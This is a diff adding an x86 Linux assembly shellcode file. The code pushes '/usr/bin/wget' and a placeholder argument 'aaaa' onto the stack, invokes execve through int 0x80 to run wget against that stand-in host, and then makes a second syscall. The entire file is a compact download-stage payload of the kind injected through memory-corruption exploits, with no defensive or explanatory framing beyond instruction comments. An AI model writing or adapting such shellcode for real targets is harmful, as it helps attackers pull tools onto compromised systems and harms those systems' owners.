@@ -1,0 +1,27 @@
+global _start
+
+section .text
+_start:
+	push byte +0xb
+	pop eax
+	; int execve(const char *, char *const [], char *const [])
+	cdq			; set edx to zero, as well
+
+	push edx		; push the terminating nul byte
+	push dword 0x61616161	; aaaa
+	mov ecx, esp		; save address of arguments
+	push edx		; push the terminating nul byte
+	push byte +0x74		; t
+	push dword 0x6567772f	; /wge
+	push dword 0x6e69622f	; /bin
+	push dword 0x7273752f	; /usr
+	mov ebx, esp		; filename
+	push edx		; push the terminating nul byte
+	push ecx		; push the address of the arguments
+	push ebx		; push the address of the filename
+	mov ecx, esp		; argv
+	; edx is already zero from the above cdq instruction
+	int 0x80
+
+	inc eax
+	int 0x80
